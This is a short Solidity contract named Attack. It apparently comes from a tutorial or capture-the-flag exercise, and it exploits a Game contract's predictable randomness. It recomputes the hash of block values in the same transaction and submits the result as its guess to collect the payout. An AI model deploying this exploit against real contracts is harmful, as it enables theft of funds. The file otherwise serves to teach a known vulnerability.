// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Game.sol";

contract Attack{

    Game game;

    constructor(address gameContract){
        game = Game(gameContract);
    }

    function attack() public{
        uint256 _guess = uint256(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(_guess);
    }


    receive() external payable{}
}